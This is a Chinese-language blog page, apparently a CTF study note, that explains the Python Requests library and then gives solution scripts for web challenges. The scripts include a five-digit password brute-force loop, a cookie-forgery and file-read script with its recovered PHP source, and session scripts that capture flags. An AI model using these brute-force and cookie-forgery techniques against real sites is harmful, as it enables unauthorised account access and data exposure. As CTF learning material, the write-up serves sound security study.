@@ -1,0 +1,740 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="keep something">
+  <meta name="author" content="luom">
+  <meta name="keywords" content="">
+  <title>python发送request包&amp;ctf - RC9&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="python发送request包&ctf">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-09 09:56" pubdate>
+        2021年10月9日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      27
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">python发送request包&amp;ctf</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2024年1月4日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="源码原理">源码&amp;原理</h2>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3MDE5OTIwNw==&amp;mid=2247484961&amp;idx=1&amp;sn=86246772e65901d1bb833055dcf66890&amp;chksm=ce903ce9f9e7b5ff2d2cffdffdefc6e60b66de5b00341e8e7b94b97d590d82f12f164e4c5a6f&amp;scene=21#wechat_redirect">公众号</a>
+、 <a target="_blank" rel="noopener" href="https://docs.python-requests.org/zh_CN/latest/user/quickstart.html#id6">手册（繁杂</a>）、<a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183249464292448">廖雪峰精简</a></p>
+</blockquote>
+<p>在Python第三方库当中，有一个Requests模块。</p>
+<p>该模块可以帮助我们发送HTTP请求，接收HTTP应答。</p>
+<h3 id="发送请求">发送请求</h3>
+<pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> requests
+&gt;&gt;&gt;a=requests.get(url=<span class="hljs-string">&quot;https://baidu.com&quot;</span>)
+&gt;&gt;&gt;a   //直接打印a，会得到响应码
+
+<span class="hljs-comment">#get传参，params=（提前准备好的字典）</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>payload = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;
+<span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.get(<span class="hljs-string">&quot;http://httpbin.org/get&quot;</span>, params=payload)
+
+<span class="hljs-comment">#通过打印输出实际请求的URL</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>print(r.url)  或者直接r.url
+http://httpbin.org/get?key2=value2&amp;key1=value1
+    
+<span class="hljs-comment">#post传参数data(字典/元组都可以（表单）)</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.post(<span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)</code></pre>
+<h3 id="查看响应内容">查看响应内容</h3>
+<pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> requests
+
+<span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.get(<span class="hljs-string">&#x27;https://api.github.com/events&#x27;</span>)&lt;Response [<span class="hljs-number">200</span>]&gt;  //直接打印r，会得到响应码
+&gt;&gt;&gt;r.status_code
+<span class="hljs-number">200</span>
+
+<span class="hljs-comment">#查看响应体内容</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>r.text     
+<span class="hljs-string">u&#x27;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">#使用print()函数打印，会识别其中的空格符以及换行符</span>
+<span class="hljs-string">&gt;&gt;&gt;print(r.text)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">#查看响应头 (返回字典)\  查看请求头：r.request.headers：</span>
+<span class="hljs-string">&gt;&gt;&gt;r.headers</span>
+<span class="hljs-string">&#123;</span>
+<span class="hljs-string">    &#x27;</span>content-encoding<span class="hljs-string">&#x27;: &#x27;</span>gzip<span class="hljs-string">&#x27;,</span>
+<span class="hljs-string">    &#x27;</span>transfer-encoding<span class="hljs-string">&#x27;: &#x27;</span>chunked<span class="hljs-string">&#x27;,</span>
+<span class="hljs-string">    &#x27;</span>connection<span class="hljs-string">&#x27;: &#x27;</span>close<span class="hljs-string">&#x27;,</span>
+<span class="hljs-string">    &#x27;</span>serve<span class="hljs-string">r&#x27;: &#x27;</span>nginx/<span class="hljs-number">1.0</span><span class="hljs-number">.4</span><span class="hljs-string">&#x27;,</span>
+<span class="hljs-string">    &#x27;</span>x-runtime<span class="hljs-string">&#x27;: &#x27;</span><span class="hljs-number">148</span>ms<span class="hljs-string">&#x27;,</span>
+<span class="hljs-string">    &#x27;</span>etag<span class="hljs-string">&#x27;: &#x27;</span><span class="hljs-string">&quot;e1ca502697e5c9317743dc078f67693f&quot;</span><span class="hljs-string">&#x27;,</span>
+<span class="hljs-string">    &#x27;</span>content-<span class="hljs-built_in">type</span><span class="hljs-string">&#x27;: &#x27;</span>application/json<span class="hljs-string">&#x27;</span>
+<span class="hljs-string">&#125;</span>
+<span class="hljs-string">&gt;&gt;&gt; r.headers[&#x27;</span>Content-Type<span class="hljs-string">&#x27;]</span>
+<span class="hljs-string">&#x27;</span>application/json<span class="hljs-string">&#x27;</span>
+<span class="hljs-string">&gt;&gt;&gt; r.headers.get(&#x27;</span>content-<span class="hljs-built_in">type</span><span class="hljs-string">&#x27;)</span>
+<span class="hljs-string">&#x27;</span>application/json<span class="hljs-string">&#x27;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">#使用for-in语句可以进行遍历：，美观展现</span>
+<span class="hljs-string">&gt;&gt;&gt;for i in res.request.headers:</span>
+<span class="hljs-string">...     print(i+&quot;:&quot;+res.request.headers[i])</span>
+<span class="hljs-string">...</span>
+<span class="hljs-string">User-Agent:python-requests/2.25.0</span>
+<span class="hljs-string">Accept-Encoding:gzip, deflate</span>
+<span class="hljs-string">Accept:*/*</span>
+<span class="hljs-string">Connection:keep-alive</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">#访问cookie</span>
+<span class="hljs-string">&gt;&gt;&gt; r.cookies[&#x27;</span>example_cookie_name<span class="hljs-string">&#x27;]</span>
+<span class="hljs-string">&#x27;</span>example_cookie_value<span class="hljs-string">&#x27;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">#传递cookie</span>
+<span class="hljs-string">&gt;&gt;&gt; url = &#x27;</span>http://httpbin.org/cookies<span class="hljs-string">&#x27;</span>
+<span class="hljs-string">&gt;&gt;&gt; cookies = dict(cookies_are=&#x27;</span>working<span class="hljs-string">&#x27;)</span>
+<span class="hljs-string">&gt;&gt;&gt; r = requests.get(url, cookies=cookies)</span>
+<span class="hljs-string">&gt;&gt;&gt; r.text</span>
+<span class="hljs-string">&#x27;</span>&#123;<span class="hljs-string">&quot;cookies&quot;</span>: &#123;<span class="hljs-string">&quot;cookies_are&quot;</span>: <span class="hljs-string">&quot;working&quot;</span>&#125;&#125;<span class="hljs-string">&#x27;</span></code></pre>
+<h3 id="session">session（）</h3>
+<p>如果你向同一主机发送多个请求，每个请求对象让你能够跨请求保持session和cookie信息，这时我们要使用到requests的Session()来保持回话请求的cookie和session与服务器的相一致。</p>
+<pre><code class="hljs python">s = requests.Session()
+
+session会话的get与post请求
+<span class="hljs-comment"># 不带可选参数的get请求</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>r = s.get(url=<span class="hljs-string">&#x27;https://github.com/timeline.json&#x27;</span>)
+<span class="hljs-comment"># 不带可选参数的post请求</span>
+<span class="hljs-meta">&gt;&gt;&gt; </span>r = s.post(url=<span class="hljs-string">&quot;http://httpbin.org/post&quot;</span>)</code></pre>
+<h2 id="例题">例题</h2>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1573148">【Python】利用Requests模块进行密码爆破</a></p>
+<ul>
+<li>https://mp.weixin.qq.com/s?__biz=Mzg3MDE5OTIwNw==&amp;mid=2247484961&amp;idx=1&amp;sn=86246772e65901d1bb833055dcf66890&amp;chksm=ce903ce9f9e7b5ff2d2cffdffdefc6e60b66de5b00341e8e7b94b97d590d82f12f164e4c5a6f&amp;scene=21#wechat_redirect</li>
+</ul>
+</blockquote>
+<p>初级：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1573148">dvwa账号密码爆破，公众号</a></p>
+<h3 id="python弱口令爆破">python弱口令爆破</h3>
+<p>爆破5位数密码</p>
+<pre><code class="hljs mel"># 弱口令爆破
+import requests
+
+def ssh():
+    url = <span class="hljs-string">&quot;http://114.67.246.176:12035/&quot;</span>
+    <span class="hljs-keyword">for</span> <span class="hljs-keyword">pwd</span> <span class="hljs-keyword">in</span> range(<span class="hljs-number">10000</span>,<span class="hljs-number">20000</span>):
+        <span class="hljs-keyword">pwd</span> = str(<span class="hljs-keyword">pwd</span>)
+        r = requests.post(url, data=&#123;<span class="hljs-string">&#x27;pwd&#x27;</span>: <span class="hljs-keyword">pwd</span>&#125;)
+        r.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>
+        r_text = r.<span class="hljs-keyword">text</span>
+        judge = <span class="hljs-string">&quot;密码不正确，请重新输入&quot;</span>
+        <span class="hljs-keyword">if</span> (judge <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>):
+            <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;尝试密码：&#123;&#125;,反应状态码：&#123;&#125;,密码错误.&quot;</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">pwd</span>, r))
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;尝试密码：&#123;&#125;,反应状态码：&#123;&#125;,密码正确.&quot;</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">pwd</span>, r))
+            <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;爆破完成&quot;</span>)
+            <span class="hljs-keyword">break</span>
+
+ssh()</code></pre>
+<h3 id="秋名山车神">秋名山车神</h3>
+<h5 id="考点python脚本session正则匹配">考点：python脚本、session、正则匹配</h5>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mitchell_Donovan/article/details/112453206">wp1</a>、<a target="_blank" rel="noopener" href="https://asd1054.github.io/bugku_first_wp/web/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA.html">wp2**</a></p>
+<p>而且刷新多次数字是变化的</p>
+<p>用python脚本：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-comment">#引入request库</span>
+<span class="hljs-keyword">import</span> re 		<span class="hljs-comment">#引入re库</span>
+ 
+url = <span class="hljs-string">&#x27;&#x27;&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;&#x27;&#x27;</span>
+s = requests.session()  <span class="hljs-comment">#用session会话保持表达式</span>
+retuen = s.get(url)
+ 
+equation = re.search(<span class="hljs-string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,retuen.text).group()
+result = <span class="hljs-built_in">eval</span>(equation)	<span class="hljs-comment">#eval()函数用来执行一个字符串表达式,并返回表达式的值。</span>
+ 
+key = &#123;<span class="hljs-string">&#x27;value&#x27;</span>:result&#125;<span class="hljs-comment">#创建一个字典类型用于传参</span>
+flag = s.post(url,data=key)<span class="hljs-comment">#用post方法传上去</span>
+ 
+print(flag.text)</code></pre>
+<p>这个脚本重点是正则，解释下</p>
+<p>re库</p>
+<ul>
+<li>re.search()表示从文本的第一个字符匹配到最后一个，其第一个参数为正则表达式，第二个参数是要匹配的文本</li>
+<li>group()返回字符串</li>
+<li>r''表示内容为原生字符串，防止被转义</li>
+<li><code>(\d+[+\-*])+(\d+)：\d+</code> 表示匹配一个或多个数字；[+-*]
+表示匹配一个加号或一个减号或一个乘号（注：减号在中括号内是特殊字符，要用反斜杠转义）；所以
+([+-*])+ 表示匹配多个数字和运算符组成的“表达式”；最后再加上一组数字 ()
+即可</li>
+</ul>
+<p>更多：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37027748">re.search 和
+re.findall 的区别</a>、、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaxiaoxu/p/9749655.html">个人博客正则表达式详解+re.research</a></p>
+<h3 id="cookie欺骗">cookie欺骗</h3>
+<h5 id="考点python写脚本逐行还原源码url里的base64in_arraycookie伪造">考点：python写脚本逐行还原源码、url里的base64、in_array、cookie伪造</h5>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26090065/article/details/81588595">csdn
+wp</a></p>
+<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">120.24.86.145:8002</span>/web<span class="hljs-number">11</span>/index.php?line=&amp;filename=a<span class="hljs-number">2</span>V<span class="hljs-number">5</span>cy<span class="hljs-number">50</span>eHQ=</code></pre>
+<p>​ 最后面是base64，解码得到keys.txt.,直接访问失败，受限。</p>
+<p>​ 尝试用
+filename访问index.php（原url使用base64，这也将index.php进行编码），line参数应该是行数，试一下
+line=2</p>
+<p>​
+发现出现一行代码，<strong>改变line出现不同的代码，则尝试用python脚本读整个源码</strong></p>
+<pre><code class="hljs php">$file= base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filename&#x27;</span>])?$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);</code></pre>
+<p>python脚本：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+a=<span class="hljs-number">30</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(a):
+    url=<span class="hljs-string">&quot;http://120.24.86.145:8002/web11/index.php?line=&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span> 
+    s=requests.get(url)
+    <span class="hljs-built_in">print</span> s.text</code></pre>
+<p>index.php源码：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filename&#x27;</span>])?$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);
+$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;line&#x27;</span>])?intval($_GET[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;
+
+<span class="hljs-keyword">if</span>($file==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);
+$file_list = <span class="hljs-keyword">array</span>( 
+<span class="hljs-string">&#x27;0&#x27;</span> =&gt;<span class="hljs-string">&#x27;keys.txt&#x27;</span>, 
+<span class="hljs-string">&#x27;1&#x27;</span> =&gt;<span class="hljs-string">&#x27;index.php&#x27;</span>,
+);
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">&#x27;margin&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>)&#123;       <span class="hljs-comment">//看这里，flag应该在keys.php里</span>
+$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;keys.php&#x27;</span>;  <span class="hljs-comment">//添加数组元素</span>
+&#125;
+
+<span class="hljs-keyword">if</span>(in_array($file, $file_list))&#123;  <span class="hljs-comment">//文件名在数组里才会显示</span>
+$fa = file($file);
+<span class="hljs-keyword">echo</span> $fa[$line];
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<ul>
+<li>判断cookie必须满足margin=margin才能访问keys.php<strong>，别忘了编码再传参、line要赋值</strong></li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-intval-function.html">intval</a>——获取变量的整数值，<strong>空的
+array 返回 0，非空的 array 返回 1。</strong></li>
+<li>in_array(value,array,type)查看A是否在B的值里</li>
+<li>file()—函数把整个文件读入一个数组中。返回数组，<strong>数组中的每个单元都是文件中相应的一行，包括换行符在内。</strong>
+<strong>如果失败，则返回 false。</strong></li>
+</ul>
+<p>payload:</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests 
+<span class="hljs-keyword">import</span> re 		
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
+    url = <span class="hljs-string">&#x27;http://114.67.246.176:19772/index.php?line=&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&amp;filename=a2V5cy5waHA=&#x27;</span>
+    data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:<span class="hljs-string">&#x27;margin&#x27;</span>&#125;
+    a = requests.get(url,cookies=data)
+    hang=a.text
+    print(hang)
+ 
+<span class="hljs-comment">#返回</span>
+&lt;?php $key=&quot;flag&#123;24019342d42d1024c75c9ebfe3520d5a&#125;&quot;; ?&gt;</code></pre>
+<h3 id="你得快点">你得快点</h3>
+<h5 id="考点burp抓包python脚本">考点：burp抓包、python脚本</h5>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041428998.png" srcset="/img/loading.gif" alt="image-20210509152215287"></p>
+<ol type="1">
+<li><p>发现flag，base64二次解码，发现不是flag，而且每次发送都会产生不一样的flag，提示post
+value，则想到用python，session提交post</p>
+<pre><code class="hljs angelscript">跑的还不错，给你flag吧: MTM0NTcz
+二次解码
+<span class="hljs-number">134573</span></code></pre></li>
+<li><p>payload</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-comment">#引入request库</span>
+<span class="hljs-keyword">import</span> re 		<span class="hljs-comment">#引入re库</span>
+<span class="hljs-keyword">import</span> base64
+
+url = <span class="hljs-string">&#x27;http://114.67.246.176:10957&#x27;</span>
+s = requests.session()  <span class="hljs-comment">#用session会话保持表达式</span>
+retuen = s.get(url)
+
+f=retuen.headers[<span class="hljs-string">&#x27;flag&#x27;</span>]
+f1=<span class="hljs-built_in">str</span>(base64.b64decode(f),<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment">#此时f1有两部分，跑的还不错，给你flag吧: NTYyNDk2，我们要对后半部分继续解码</span>
+<span class="hljs-comment">#print(f1)</span>
+f2=f1.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">1</span>]   <span class="hljs-comment">#获得后半部分的base64</span>
+f2=base64.b64decode(f2)   <span class="hljs-comment">#需二次解码，否则显示再快点</span>
+print(f2)
+data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:f2&#125;
+result=s.post(url,data=data)
+print(result.text)
+
+//返回：
+<span class="hljs-string">b&#x27;806742&#x27;</span>
+flag&#123;c1d81e45e46b547e52afd4f6280b2127&#125;</code></pre></li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">CTF,计算机基础</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/25/%E7%BD%91%E7%AB%99%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">网站架构知识点</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/29/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/">
+                        <span class="hidden-mobile">绿城杯Web部分WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
